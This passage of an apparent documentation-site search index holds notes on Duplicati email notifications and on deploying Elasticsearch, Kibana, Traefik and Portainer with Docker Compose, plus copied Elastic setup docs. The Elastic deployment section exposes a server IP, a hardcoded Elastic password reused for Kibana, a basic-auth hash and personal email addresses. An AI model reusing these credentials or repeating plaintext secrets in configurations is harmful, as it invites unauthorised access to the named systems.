remove the old dangling images: <code>docker image prune</code></li> </ul> <p>Note: We do not endorse the use of Watchtower as a solution to automated updates of existing Docker containers. In fact we generally discourage automated updates. However, this is a useful tool for one-time manual updates of containers where you have forgotten the original parameters. In the long term, we highly recommend using Docker Compose.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#image-update-notifications-diun-docker-image-update-notifier","title":"Image Update Notifications - Diun (Docker Image Update Notifier)","text":"<ul> <li>We recommend Diun for update notifications. Other tools that automatically update containers unattended are not recommended or supported.</li> </ul>"},{"location":"Duplicatti/duplicattiDocumentation/#building-locally","title":"Building locally","text":"<p>If you want to make local modifications to these images for development purposes or just to customize the logic:</p> <pre><code>git clone https://github.com/linuxserver/docker-duplicati.git\ncd docker-duplicati\ndocker build \\\n  --no-cache \\\n  --pull \\\n  -t lscr.io/linuxserver/duplicati:latest .\n</code></pre> <p>The ARM variants can be built on x86_64 hardware using <code>multiarch/qemu-user-static</code></p> <pre><code>docker run --rm --privileged multiarch/qemu-user-static:register --reset\n</code></pre> <p>Once registered you can define the dockerfile to use with <code>-f Dockerfile.aarch64</code>.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#versions","title":"Versions","text":"<ul> <li>03.08.22: - Deprecate armhf.</li> <li>25.04.22: - Rebase to mono:focal.</li> <li>01.08.19: - Rebase to Linuxserver LTS mono version.</li> <li>16.07.19: - Allow for additional command line arguments in an environment variable.</li> <li>28.06.19: - Rebase to bionic.</li> <li>23.03.19: - Switching to new Base images, shift to arm32v7 tag.</li> <li>28.02.19: - Allow access from all hostnames, clarify info on image tags.</li> <li>13.01.19: - Use jq instead of awk in dockerfiles.</li> <li>11.01.19: - Multi-arch image.</li> <li>09.12.17: - Fix continuation lines.</li> <li>31.08.17: - Build only beta or release versions (thanks deasmi).</li> <li>24.04.17: - Initial release.</li> </ul>"},{"location":"Duplicatti/mailSend/","title":"mailSend","text":"<pre><code>--send-mail-url=smtp://smtp.gmail.com:587/?starttls=when-available\n--send-mail-any-operation=true\n--send-mail-subject=Duplicati %PARSEDRESULT%, %OPERATIONNAME% report for %backup-name%\n--send-mail-to=destination_email_address@whatever.com\n--send-mail-username=your_sending_gmail_username@gmail.com\n--send-mail-password=your_sending_gmail_password\n--send-mail-from=This_computers_name backup &lt;your_sending_gmail_username@gmail.com&gt;\n</code></pre> <pre><code>--send-mail-from=aaa@bluetrailsoft.com\n--send-mail-username=aaa@bluetrailsoft.com\n--send-mail-level=all\n--send-mail-password=\n--send-mail-url=smtp://smtp.gmail.com:587/?starttls=when-available\n--send-mail-subject=Duplicati %OPERATIONNAME%\n--send-mailbody=%backup-name%\n--send-mail-to=rafaelm@bluetrailsoft.com\n</code></pre>"},{"location":"Duplicatti/mailSend/#how-to-configure-automatic-email-notifications-via-gmail-for-every-backup-job","title":"How to configure automatic email notifications via gmail for every backup job","text":"<p>This article explains how to configure automated email notifications via gmail at the conclusion of every Duplicati operation (backup, restore, etc.). With this approach, every Duplicati job on the machine will send automated notifications \u2013 you don\u2019t need to configure each job individually.</p> <ul> <li> <p>Open Duplicati</p> </li> <li> <p>Click on Settings.</p> </li> </ul> Screenshot 1<p></p>image.png1439\u00d7463 34.3 KB<p></p> <ul> <li>Scroll down to \u201cdefault options\u201d and click on \u201cedit as text\u201d.</li> </ul> Screenshot 2<p></p>image.png959\u00d7354 17.8 KB<p></p> <ul> <li>Copy the text block below, and paste it into the \u201cOptions\u201d text box</li> </ul> Text block you need to copy<p><code>--</code>send-mail-url=smtp://smtp.gmail.com:587/?starttls=when-available<code>--</code>send-mail-any-operation=true<code>--</code>send-mail-subject=Duplicati %PARSEDRESULT%, %OPERATIONNAME% report for %backup-name%<code>--</code>send-mail-to=destination_email_address@whatever.com<code>--</code>send-mail-username=your_sending_gmail_username@gmail.com<code>--</code>send-mail-password=your_sending_gmail_password<code>--</code>send-mail-from=This_computers_name backup &lt;your_sending_gmail_username@gmail.com&gt;<code></code><code></code></p> Screenshot 3, showing location of where to paste the copied text<p></p>image.png1045\u00d7509 18.1 KB<p></p> <ul> <li>Click on the \u201cEdit as list\u201d button</li> </ul> Screenshot 4<p></p>image.png968\u00d7316 21.3 KB<p></p> <p>You will now see 7 advanced options.</p> Screenshot 5<p></p>image.png816\u00d7756 65.1 KB<p></p> <p>The first 3 do not need to be modified. The last 4 need to be modified as follows:</p> <ul> <li>Replace destination_email_address@whatever.com with the email address you want the status message sent to.</li> <li>Replace your_sending_gmail_username@gmail.com with the email address of the gmail account you are using to send the message. (Note that there are two places where you need to make this change)</li> <li>Replace ***your_sending_gmail_password*** with the password of the gmail account you are using to send the message.</li> <li>Replace ***This_computers_name*** with the name of the computer that the backup job is running on.</li> </ul> <p>Click the \u201cOK\u201d button at the bottom of the screen to save your results.</p> <p>You will now receive an email message at the conclusion of every Duplicati job that is run on the current computer.</p> <p>This can generate a lot of email clutter \u2013 a report for every backup job run. There are two approaches to reducing the volume of email received.</p> <p>My recommend approach is using dupReport.py 346 to generate summary reports. This excellent tool was developed by @handyguy. If you do this, be sure to modify the \u201csubjectregex=\u201d line in dupReport.rc as shown below to ensure the summary reports work for either the default subject line or the subject line used in this writeup.</p> <pre><code>subjectregex = ^Duplicati ([\\w ]*, |)Backup report for\n</code></pre> <p>You also need to add a filter to your email client to automatically move the duplicati-generated email\u2019s out of your inbox and into an email folder which dupReport.py can process.</p> <p>Alternatively, as suggested by @sanderson, below, you can add this setting: <code>--send-mail-level=Warning,Error,Fatal</code></p> <p>The one downside to this approach is that it doesn\u2019t differentiate between a backup job that succeeded and one that never ran, as the result of both conditions is that no email is sent. This is why I prefer the dupReport.py approach.</p>"},{"location":"Elastic/Cartier%20Eslastic%20%26%20Kibana/","title":"Cartier Eslastic &amp; Kibana","text":"<p>Server</p> <p>Server name: elastic-search-vm-1-https</p> <p>IP Address: 34.28.95.74</p> <p>APP SOURCE PATH:</p> <ul> <li>Docker-compose (Kibana &amp; Elastic): \"/usr/src/cartier/apps\"</li> <li>Docker-compose (Postainer &amp; Traefik): \"/usr/src/cartier/portainer+traefik/core\"</li> <li>Docker Volume (es_data): \"/mnt/disks/disk1/docker/volumes/cartier_es_data/\"</li> </ul> <p>Temporary DNS</p> <p>https://elastic.carti3r.tk</p> <p>https://kibana.carti3r.tk</p> <p>https://portainer.carti3r.tk</p> <p>https://traefik.carti3r.tk</p>"},{"location":"Elastic/Cartier%20Eslastic%20%26%20Kibana/#new-deploy-steps","title":"New deploy steps","text":"<p>Connect to VM by ssh.</p> <pre><code># Get sudo permissions\nsudo -i\n</code></pre> <p>Create a work directory and go in</p> <pre><code># Create directory\nmkdir /usr/src/cartier\n# Change the current working directory\ncd /usr/src/cartier\n</code></pre> <p>Clone this private repository with preset-ed tools.</p> <pre><code># Clone repository\ngit clone git@github.com:RMadVar/CrtDeployElasticKibana.git ./portainer+traefik\n</code></pre> <p>This repository have all configuration files ready to start but I will share with you a basic instructions to modify it.</p> <p>This is a tree of repository.</p> <pre><code>.\n\u2514\u2500\u2500 portainer+traefik/\n    \u251c\u2500\u2500 core/\n    \u2502   \u251c\u2500\u2500 traefik-data/\n    \u2502   \u2502   \u251c\u2500\u2500 configurations/\n    \u2502   \u2502   \u2502   \u2514\u2500\u2500 dynamic.yml\n    \u2502   \u2502   \u251c\u2500\u2500 traefik.yml\n    \u2502   \u2502   \u2514\u2500\u2500 acme.json\n    \u2502   \u2514\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 apps/docker-compose.yml\n</code></pre> <p>We need to change permission for \"acme.json\"</p> <pre><code>cd /usr/src/cartier/portainer+traefik/core/traefik-data\nchmod 600 acme.json\n</code></pre> <p>Traefik.yml control the entrypoint and SSL.</p> <pre><code># traefik.yml\napi:\n  dashboard: true\n\nentryPoints:\n  web:\n    address: :80\n    http:\n      redirections:\n        entryPoint:\n          to: websecure\n\n  websecure:\n    address: :443\n    http:\n      middlewares:\n        - secureHeaders@file\n      tls:\n        certResolver: letsencrypt\n\nproviders:\n  docker:\n    endpoint: \"unix:///var/run/docker.sock\"\n    exposedByDefault: false\n  file:\n    filename: /configurations/dynamic.yml\n\ncertificatesResolvers:\n  letsencrypt:\n    acme:\n      email: &lt;your_email&gt; &lt;------------------------------------- #Change it\n      storage: acme.json\n      keyType: EC384\n      httpChallenge:\n        entryPoint: web\n</code></pre>"},{"location":"Elastic/Cartier%20Eslastic%20%26%20Kibana/#_1","title":"Cartier Eslastic &amp; Kibana","text":"<p>dynamic.yml This file contains our middlewares to make sure all our traffic is fully secure and runs over TLS. We also set the basic auth here for our Traefik dashboard, because by default it is accessible for everyone.</p> <pre><code># dynamic.yml\nhttp:\n  middlewares:\n    secureHeaders:\n      headers:\n        sslRedirect: true\n        forceSTSHeader: true\n        stsIncludeSubdomains: true\n        stsPreload: true\n        stsSeconds: 31536000\n\n    user-auth:\n      basicAuth:\n        users:\n          - \"raf:$apr1$MTqfVwiE$FKkzT5ERGFqwH9f3uipxA1\" &lt;------------- # Generate user and password with\n          # \"echo $(htpasswd -nb &lt;USER&gt; &lt;PASSWORD&gt;) | sed -e s/\\\\$/\\\\$\\\\$/g\"\n\ntls:\n  options:\n    default:\n      cipherSuites:\n        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\n        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n        - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n        - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n        - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305\n      minVersion: VersionTLS12\n</code></pre> <p>core/docker-compose.yml</p> <pre><code># docker-compose.yml\nversion: \"3\"\n\nservices:\n  traefik:\n    image: traefik:latest\n    container_name: traefik\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - proxy\n    ports:\n      - 80:80\n      - 443:443\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./traefik-data/traefik.yml:/traefik.yml:ro\n      - ./traefik-data/acme.json:/acme.json\n      - ./traefik-data/configurations:/configurations\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.traefik-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.traefik-secure.rule=Host(`traefik.yourdomain.com`)\"\n      - \"traefik.http.routers.traefik-secure.service=api@internal\"\n      - \"traefik.http.routers.traefik-secure.middlewares=user-auth@file\"\n\n  portainer:\n    image: portainer/portainer-ce:latest\n    container_name: portainer\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - proxy\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./portainer-data:/data\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.portainer-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.portainer-secure.rule=Host(`portainer.yourdomain.com`)\"\n      - \"traefik.http.routers.portainer-secure.service=portainer\"\n      - \"traefik.http.services.portainer.loadbalancer.server.port=9000\"\n\nnetworks:\n  proxy:\n    external: true\n</code></pre> <p>apps/docker-compose.yml</p> <pre><code>version: \"3.9\"\nservices:\n  elasticsearch:\n    image: elasticsearch:8.2.2\n    environment:\n      - discovery.type=single-node\n      - ES_JAVA_OPTS=-Xms1g -Xmx1g\n      - xpack.security.enabled=true\n      - ELASTIC_PASSWORD=cartier419\n    volumes:\n      - es_data:/usr/share/elasticsearch/data\n        #ports:\n        #- target: 9200\n        #published: 9200\n    expose:\n      - 9200\n    networks:\n      - elastic\n      - proxy\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.elastic.entrypoints=websecure\"\n      - \"traefik.http.routers.elastic.rule=Host(`elastic.carti3r.tk`)\"\n      - \"traefik.http.services.elastic.loadbalancer.server.port=9200\"\n  kibana:\n    image: kibana:8.2.2\n    environment:\n      - ELASTICSEARCH_URL=http://0.0.0.0:9200/ \n      - ELASTICSEARCH_USERNAME=alg_kibana\n      - ELASTICSEARCH_PASSWORD=cartier419\n        #ports:\n        #- target: 5601\n        #published: 5601\n    expose:\n      - 5601\n    depends_on:\n      - elasticsearch\n    networks:\n      - elastic      \n      - proxy\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.kibana.entrypoints=websecure\"\n      - \"traefik.http.routers.kibana.rule=Host(`kibana.carti3r.tk`)\"\n      - \"traefik.http.services.kibana.loadbalancer.server.port=5601\"\nvolumes:\n  es_data:\n    driver: local\n\nnetworks:\n  elastic:\n    name: elastic\n    driver: bridge\n  proxy:\n      external: true\n</code></pre> <p>Create this network</p> <pre><code>docker network create proxy\n</code></pre> <p>Go to \"/usr/src/cartier/portainer+traefik/core\"</p> <pre><code># Move to the work directory and execute docker compose command.\ncd /usr/src/cartier/portainer+traefik/core\n# Start Portainer + Traefik\ndocker-compose up -d\n</code></pre> <p>Now we are going to start Kibana &amp; Elastic</p> <pre><code># Move to the work directory and execute docker compose command.\ncd /usr/src/cartier/portainer+traefik/apps\n# Start Portainer + Traefik\ndocker-compose up -d\n</code></pre> <p>You can check \"TUTORIAL.md\" for more details.</p>"},{"location":"Elastic/ElasticKibanaCompose/","title":"ElasticKibanaCompose","text":""},{"location":"Elastic/ElasticKibanaCompose/#install-elasticsearch-with-dockeredit","title":"Install Elasticsearch with Dockeredit","text":"<p>Elasticsearch is also available as Docker images. A list of all published Docker images and tags is available at www.docker.elastic.co. The source files are in Github.</p> <p>This package contains both free and subscription features. Start a 30-day trial to try out all of the features.</p> <p>Starting in Elasticsearch 8.0, security is enabled by default. With security enabled, Elastic Stack security features require TLS encryption for the transport networking layer, or your cluster will fail to start.</p>"},{"location":"Elastic/ElasticKibanaCompose/#install-docker-desktop-or-docker-engineedit","title":"Install Docker Desktop or Docker Engineedit","text":"<p>Install the appropriate Docker application for your operating system.</p> <p>Make sure that Docker is allotted at least 4GiB of memory. In Docker Desktop, you configure resource usage on the Advanced tab in Preference (macOS) or Settings (Windows).</p>"},{"location":"Elastic/ElasticKibanaCompose/#pull-the-elasticsearch-docker-imageedit","title":"Pull the Elasticsearch Docker imageedit","text":"<p>Obtaining Elasticsearch for Docker is as simple as issuing a <code>docker pull</code> command against the Elastic Docker registry.</p> <pre><code>docker pull docker.elastic.co/elasticsearch/elasticsearch:8.6.1\n</code></pre> <p>Now that you have the Elasticsearch Docker image, you can start a single-node or multi-node cluster.</p>"},{"location":"Elastic/ElasticKibanaCompose/#start-a-single-node-cluster-with-dockeredit","title":"Start a single-node cluster with Dockeredit","text":"<p>If you\u2019re starting a single-node Elasticsearch cluster in a Docker container, security will be automatically enabled and configured for you. When you start Elasticsearch for the first time, the following security configuration occurs automatically:</p> <ul> <li>Certificates and keys are generated for the transport and HTTP layers.</li> <li>The Transport Layer Security (TLS) configuration settings are written to <code>elasticsearch.yml</code>.</li> <li>A password is generated for the <code>elastic</code> user.</li> <li>An enrollment token is generated for Kibana.</li> </ul> <p>You can then start Kibana and enter the enrollment token, which is valid for 30 minutes. This token automatically applies the security settings from your Elasticsearch cluster, authenticates to Elasticsearch with the <code>kibana_system</code> user, and writes the security configuration to <code>kibana.yml</code>.</p> <p>The following commands start a single-node Elasticsearch cluster for development or testing.</p> <ol> <li>Create a new docker network for Elasticsearch and Kibana</li> </ol> <p><code>sh    docker network create elastic</code></p> <ol> <li>Start Elasticsearch in Docker. A password is generated for the <code>elastic</code> user and output to the terminal, plus an enrollment token for enrolling Kibana.</li> </ol> <p><code>sh    docker run --name es01 --net elastic -p 9200:9200 -it docker.elastic.co/elasticsearch/elasticsearch:8.6.1</code></p> <p>You might need to scroll back a bit in the terminal to view the password and enrollment token.</p> <ol> <li>Copy the generated password and enrollment token and save them in a secure location. These values are shown only when you start Elasticsearch for the first time.</li> </ol> <p>If you need to reset the password for the <code>elastic</code> user or other built-in users, run the <code>elasticsearch-reset-password</code> tool. This tool is available in the Elasticsearch <code>/bin</code> directory of the Docker container. For example:</p> <p><code>sh    docker exec -it es01 /usr/share/elasticsearch/bin/elasticsearch-reset-password</code></p> <ol> <li>Copy the <code>http_ca.crt</code> security certificate from your Docker container to your local machine.</li> </ol> <p><code>sh    docker cp es01:/usr/share/elasticsearch/config/certs/http_ca.crt .</code></p> <ol> <li>Open a new terminal and verify that you can connect to your Elasticsearch cluster by making an authenticated call, using the <code>http_ca.crt</code> file that you copied from your Docker container. Enter the password for the <code>elastic</code> user when prompted.</li> </ol> <p><code>sh    curl --cacert http_ca.crt -u elastic https://localhost:9200</code></p>"},{"location":"Elastic/ElasticKibanaCompose/#enroll-additional-nodesedit","title":"Enroll additional nodesedit","text":"<p>When you start Elasticsearch for the first time, the installation process configures a single-node cluster by default. This process also generates an enrollment token and prints it to your terminal. If you want a node to join an existing cluster, start the new node with the generated enrollment token.</p> <p>Generating enrollment tokens</p> <p>The enrollment token is valid for 30 minutes. If you need to generate a new enrollment token, run the <code>elasticsearch-create-enrollment-token</code> tool on your existing node. This tool is available in the Elasticsearch <code>bin</code> directory of the Docker container.</p> <p>For example, run the following command on the existing <code>es01</code> node to generate an enrollment token for new Elasticsearch nodes:</p> <pre><code>docker exec -it es01 /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s node\n</code></pre> <ol> <li> <p>In the terminal where you started your first node, copy the generated enrollment token for adding new Elasticsearch nodes.</p> </li> <li> <p>On your new node, start Elasticsearch and include the generated enrollment token.</p> </li> </ol> <p><code>sh    docker run -e ENROLLMENT_TOKEN=\"&lt;token&gt;\" --name es02 --net elastic -it docker.elastic.co/elasticsearch/elasticsearch:8.6.1</code></p> <p>Elasticsearch is now configured to join the existing cluster.</p>"},{"location":"Elastic/ElasticKibanaCompose/#setting-jvm-heap-sizeedit","title":"Setting JVM heap sizeedit","text":"<p>If you experience issues where the container where your first node is running exits when your second node starts, explicitly set values for the JVM heap size. To manually configure the heap size, include the <code>ES_JAVA_OPTS</code> variable and set values for <code>-Xms</code> and <code>-Xmx</code> when starting each node. For example, the following command starts node <code>es02</code> and sets the minimum and maximum JVM heap size to 1 GB:</p> <pre><code>docker run -e ES_JAVA_OPTS=\"-Xms1g -Xmx1g\" -e ENROLLMENT_TOKEN=\"&lt;token&gt;\" --name es02 -p 9201:9200 --net elastic -it docker.elastic.co/elasticsearch/elasticsearch:8.6.1\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#next-stepsedit","title":"Next stepsedit","text":"<p>You now have a test Elasticsearch environment set up. Before you start serious development or go into production with Elasticsearch, review the requirements and recommendations to apply when running Elasticsearch in Docker in production.</p>"},{"location":"Elastic/ElasticKibanaCompose/#security-certificates-and-keysedit","title":"Security certificates and keysedit","text":"<p>When you install Elasticsearch, the following certificates and keys are generated in the Elasticsearch configuration directory, which are used to connect a Kibana instance to your secured Elasticsearch cluster and to encrypt internode communication. The files are listed here for reference.</p> <ul> <li><code>http_ca.crt</code></li> </ul> <p>The CA certificate that is used to sign the certificates for the HTTP layer of this Elasticsearch cluster.</p> <ul> <li><code>http.p12</code></li> </ul> <p>Keystore that contains the key and certificate for the HTTP layer for this node.</p> <ul> <li><code>transport.p12</code></li> </ul> <p>Keystore that contains the key and certificate for the transport layer for all the nodes in your cluster.</p> <p><code>http.p12</code> and <code>transport.p12</code> are password-protected PKCS#12 keystores. Elasticsearch stores the passwords for these keystores as secure settings. To retrieve the passwords so that you can inspect or change the keystore contents, use the <code>bin/elasticsearch-keystore</code> tool.</p> <p>Use the following command to retrieve the password for <code>http.p12</code>:</p> <pre><code>bin/elasticsearch-keystore show xpack.security.http.ssl.keystore.secure_password\n</code></pre> <p>Use the following command to retrieve the password for <code>transport.p12</code>:</p> <pre><code>bin/elasticsearch-keystore show xpack.security.transport.ssl.keystore.secure_password\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#start-a-multi-node-cluster-with-docker-composeedit","title":"Start a multi-node cluster with Docker Composeedit","text":"<p>To get a multi-node Elasticsearch cluster and Kibana up and running in Docker with security enabled, you can use Docker Compose.</p> <p>This configuration provides a simple method of starting a secured cluster that you can use for development before building a distributed deployment with multiple hosts.</p>"},{"location":"Elastic/ElasticKibanaCompose/#prerequisitesedit","title":"Prerequisitesedit","text":"<p>Install the appropriate Docker application for your operating system.</p> <p>If you\u2019re running on Linux, install Docker Compose.</p> <p>Make sure that Docker is allotted at least 4GB of memory. In Docker Desktop, you configure resource usage on the Advanced tab in Preferences (macOS) or Settings (Windows).</p>"},{"location":"Elastic/ElasticKibanaCompose/#prepare-the-environmentedit","title":"Prepare the environmentedit","text":"<p>Create the following configuration files in a new, empty directory. These files are also available from the elasticsearch repository on GitHub.</p>"},{"location":"Elastic/ElasticKibanaCompose/#envedit","title":"<code>.env</code>edit","text":"<p>The <code>.env</code> file sets environment variables that are used when you run the <code>docker-compose.yml</code> configuration file. Ensure that you specify a strong password for the <code>elastic</code> and <code>kibana_system</code> users with the <code>ELASTIC_PASSWORD</code> and <code>KIBANA_PASSWORD</code> variables. These variable are referenced by the <code>docker-compose.yml</code> file.</p> <p>Your passwords must be alphanumeric, and cannot contain special characters such as <code>!</code> or <code>@</code>. The <code>bash</code> script included in the <code>docker-compose.yml</code> file only operates on alphanumeric characters.</p> <pre><code># Password for the 'elastic' user (at least 6 characters)\nELASTIC_PASSWORD=\n\n# Password for the 'kibana_system' user (at least 6 characters)\nKIBANA_PASSWORD=\n\n# Version of Elastic products\nSTACK_VERSION=8.6.1\n\n# Set the cluster name\nCLUSTER_NAME=docker-cluster\n\n# Set to 'basic' or 'trial' to automatically start the 30-day trial\nLICENSE=basic\n#LICENSE=trial\n\n# Port to expose Elasticsearch HTTP API to the host\nES_PORT=9200\n#ES_PORT=127.0.0.1:9200\n\n# Port to expose Kibana to the host\nKIBANA_PORT=5601\n#KIBANA_PORT=80\n\n# Increase or decrease based on the available host memory (in bytes)\nMEM_LIMIT=1073741824\n\n# Project namespace (defaults to the current folder name if not set)\n#COMPOSE_PROJECT_NAME=myproject\n</code></pre>"},{"location":"Elastic/ElasticKibanaCompose/#docker-composeymledit","title":"<code>docker-compose.yml</code>edit","text":"<p>This <code>docker-compose.yml</code> file creates a three-node secure Elasticsearch cluster with authentication and network encryption enabled, and a Kibana instance securely connected to it.</p> <p>Exposing ports</p> <p>This configuration exposes port <code>9200</code> on all network interfaces. Because of how Docker handles ports, a port that isn\u2019t bound to <code>localhost</code> leaves your Elasticsearch cluster publicly accessible, potentially ignoring any firewall settings. If you don\u2019t want to expose port <code>9200</code> to external hosts, set the value for <code>ES_PORT</code> in the <code>.env</code> file to something like <code>127.0.0.1:9200</code>. Elasticsearch will then only be accessible from the host machine itself.</p> <pre><code>version: \"2.2\"\n\nservices:\n  setup:\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n    user: \"0\"\n    command: &gt;\n      bash -c '\n        if [ x${ELASTIC_PASSWORD} == x ]; then\n          echo \"Set the ELASTIC_PASSWORD environment variable in the .env file\";\n          exit 1;\n        elif [ x${KIBANA_PASSWORD} == x ]; then\n          echo \"Set the KIBANA_PASSWORD environment variable in the .env file\";\n          exit 1;\n        fi;\n        if [ ! -f config/certs/ca.zip ]; then\n          echo \"Creating CA\";\n          bin/elasticsearch-certutil ca --silent --pem -out config/certs/ca.zip;\n          unzip config/certs/ca.zip -d config/certs;\n        fi;\n        if [ ! -f config/certs/certs.zip ]; then\n          echo \"Creating certs\";\n          echo -ne \\\n          \"instances:\\n\"\\\n          \"  - name: es01\\n\"\\\n          \"    dns:\\n\"\\\n          \"      - es01\\n\"\\\n          \"      - localhost\\n\"\\\n          \"    ip:\\n\"\\\n          \"      - 127.0.0.1\\n\"\\\n          \"  - name: es02\\n\"\\\n          \"    dns:\\n\"\\\n          \"      - es02\\n\"\\\n          \"      - localhost\\n\"\\\n          \"    ip:\\n\"\\\n          \"      - 127.0.0.1\\n\"\\\n          \"  - name: es03\\n\"\\\n          \"    dns:\\n\"\\\n          \"      - es03\\n\"\\\n          \"      - localhost\\n\"\\\n          \"    ip:\\n\"\\\n          \"      - 127.0.0.1\\n\"\\\n          &gt; config/certs/instances.yml;\n          bin/elasticsearch-certutil cert --silent --pem -out config/certs/certs.zip --in config/certs/instances.yml --ca-cert config/certs/ca/ca.crt --ca-key config/certs/ca/ca.key;\n          unzip config/certs/certs.zip -d config/certs;\n        fi;\n        echo \"Setting file permissions\"\n        chown -R root:root config/certs;\n        find . -type d -exec chmod 750 \\{\\} \\;;\n        find . -type f -exec chmod 640 \\{\\} \\;;\n        echo \"Waiting for Elasticsearch availability\";\n        until curl -s --cacert config/certs/ca/ca.crt https://es01:9200 | grep -q \"missing authentication credentials\"; do sleep 30; done;\n        echo \"Setting kibana_system password\";\n        until curl -s -X POST --cacert config/certs/ca/ca.crt -u \"elastic:${ELASTIC_PASSWORD}\" -H \"Content-Type: application/json\" https://es01:9200/_security/user/kibana_system/_password -d \"{\\\"password\\\":\\\"${KIBANA_PASSWORD}\\\"}\" | grep -q \"^{}\"; do sleep 10; done;\n        echo \"All done!\";\n      '\n    healthcheck:\n      test: [\"CMD-SHELL\", \"[ -f config/certs/es01/es01.crt ]\"]\n      interval: 1s\n      timeout: 5s\n      retries: 120\n\n  es01:\n    depends_on:\n      setup:\n        condition: service_healthy\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n      - esdata01:/usr/share/elasticsearch/data\n    ports:\n      - ${ES_PORT}:9200\n    environment:\n      - node.name=es01\n      - cluster.name=${CLUSTER_NAME}\n      - cluster.initial_master_nodes=es01,es02,es03\n      - discovery.seed_hosts=es02,es03\n      - ELASTIC_PASSWORD=${ELASTIC_PASSWORD}\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=true\n      - xpack.security.http.ssl.enabled=true\n      - xpack.security.http.ssl.key=certs/es01/es01.key\n      - xpack.security.http.ssl.certificate=certs/es01/es01.crt\n      - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.enabled=true\n      - xpack.security.transport.ssl.key=certs/es01/es01.key\n      - xpack.security.transport.ssl.certificate=certs/es01/es01.crt\n      - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.verification_mode=certificate\n      - xpack.license.self_generated.type=${LICENSE}\n    mem_limit: ${MEM_LIMIT}\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q 'missing authentication credentials'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\n  es02:\n    depends_on:\n      - es01\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n      - esdata02:/usr/share/elasticsearch/data\n    environment:\n      - node.name=es02\n      - cluster.name=${CLUSTER_NAME}\n      - cluster.initial_master_nodes=es01,es02,es03\n      - discovery.seed_hosts=es01,es03\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=true\n      - xpack.security.http.ssl.enabled=true\n      - xpack.security.http.ssl.key=certs/es02/es02.key\n      - xpack.security.http.ssl.certificate=certs/es02/es02.crt\n      - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.enabled=true\n      - xpack.security.transport.ssl.key=certs/es02/es02.key\n      - xpack.security.transport.ssl.certificate=certs/es02/es02.crt\n      - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.verification_mode=certificate\n      - xpack.license.self_generated.type=${LICENSE}\n    mem_limit: ${MEM_LIMIT}\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q 'missing authentication credentials'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\n  es03:\n    depends_on:\n      - es02\n    image: docker.elastic.co/elasticsearch/elasticsearch:${STACK_VERSION}\n    volumes:\n      - certs:/usr/share/elasticsearch/config/certs\n      - esdata03:/usr/share/elasticsearch/data\n    environment:\n      - node.name=es03\n      - cluster.name=${CLUSTER_NAME}\n      - cluster.initial_master_nodes=es01,es02,es03\n      - discovery.seed_hosts=es01,es02\n      - bootstrap.memory_lock=true\n      - xpack.security.enabled=true\n      - xpack.security.http.ssl.enabled=true\n      - xpack.security.http.ssl.key=certs/es03/es03.key\n      - xpack.security.http.ssl.certificate=certs/es03/es03.crt\n      - xpack.security.http.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.enabled=true\n      - xpack.security.transport.ssl.key=certs/es03/es03.key\n      - xpack.security.transport.ssl.certificate=certs/es03/es03.crt\n      - xpack.security.transport.ssl.certificate_authorities=certs/ca/ca.crt\n      - xpack.security.transport.ssl.verification_mode=certificate\n      - xpack.license.self_generated.type=${LICENSE}\n    mem_limit: ${MEM_LIMIT}\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    healthcheck:\n      test:\n        [\n          \"CMD-SHELL\",\n          \"curl -s --cacert config/certs/ca/ca.crt https://localhost:9200 | grep -q 'missing authentication credentials'\",\n        ]\n      interval: 10s\n      timeout: 10s\n      retries: 120\n\n  kibana:\n    depends_on:\n      es01:\n        condition: service_healthy\n      es02:\n   